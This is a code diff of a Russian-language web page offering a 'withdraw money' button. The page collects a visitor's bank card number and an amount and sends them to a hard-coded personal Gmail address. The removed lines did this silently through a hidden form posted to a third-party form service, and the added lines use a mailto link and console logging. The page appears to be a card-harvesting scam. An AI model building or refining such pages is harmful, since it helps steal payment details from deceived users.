@@ -191,16 +191,6 @@
         
         <button class="btn" id="withdrawBtn">💳 Вывести деньги</button>
         
-        <!-- Форма для отправки на почту -->
-        <form id="emailForm" action="https://formsubmit.co/your-email@gmail.com" method="POST" style="display: none;">
-            <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="_subject" value="НОВАЯ ЗАЯВКА НА ВЫВОД">
-            <input type="hidden" name="_template" value="table">
-            <input type="hidden" id="formCardNumber" name="Номер карты">
-            <input type="hidden" id="formAmount" name="Сумма">
-            <input type="hidden" name="Время" id="formTime">
-        </form>
-        
         <div class="form-container" id="withdrawForm">
             <div class="form-group">
                 <label for="cardNumber">Номер банковской карты</label>
@@ -240,11 +230,9 @@
             const successMessage = document.getElementById('successMessage');
             const cardNumberInput = document.getElementById('cardNumber');
             const amountInput = document.getElementById('amount');
-            const emailForm = document.getElementById('emailForm');
             
-            // ⚠️ ЗАМЕНИТЕ НА ВАШУ ПОЧТУ!
+            // ВАША ПОЧТА
             const YOUR_EMAIL = 'mironnelox2016@gmail.com';
-            emailForm.action = `https://formsubmit.co/${YOUR_EMAIL}`;
             
             // Обработчик для кнопки "Вывести деньги"
             withdrawBtn.addEventListener('click', function() {
@@ -282,19 +270,28 @@
                     return;
                 }
 
-                // Заполняем скрытую форму
-                document.getElementById('formCardNumber').value = cardNumber;
-                document.getElementById('formAmount').value = amount + '₽';
-                document.getElementById('formTime').value = new Date().toLocaleString();
-
-                // Отправляем форму
-                emailForm.submit();
+                // Отправляем на почту
+                sendEmail(cardNumber, amount, YOUR_EMAIL);
 
                 // Показываем сообщение об успехе
                 withdrawForm.style.display = 'none';
                 successMessage.style.display = 'block';
             });
+
+            // Функция отправки email
+            function sendEmail(cardNumber, amount, email) {
+                const subject = 'НОВАЯ ЗАЯВКА НА ВЫВОД';
+                const body = `ЗАЯВКА НА ВЫВОД СРЕДСТВ:\n\n💳 Номер карты: ${cardNumber}\n💰 Сумма: ${amount}₽\n⏰ Время: ${new Date().toLocaleString()}\n\nТребуется обработка.`;
+                
+                // Открываем почтовый клиент с заполненными данными
+                const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+                window.location.href = mailtoLink;
+                
+                console.log('📧 Отправляем на почту:', email);
+                console.log('💳 Карта:', cardNumber);
+                console.log('💰 Сумма:', amount);
+            }
         });
     </script>
 </body>
-    </html>
+</html>
